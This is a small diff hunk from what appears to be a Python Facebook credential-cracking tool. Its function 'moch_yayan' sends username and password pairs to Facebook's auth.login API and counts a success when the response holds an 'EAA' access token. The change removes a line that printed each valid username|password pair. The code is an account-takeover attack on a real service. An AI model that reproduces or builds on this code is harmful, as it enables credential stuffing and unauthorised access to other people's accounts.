@@ -133,7 +133,6 @@ def moch_yayan():
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
              if 'EAA' in response.text:
-                 print(f"\r\033[1;92m   --> {username}|{password}                       ",end="")
                  print()
                  result += 1
                  if cek:
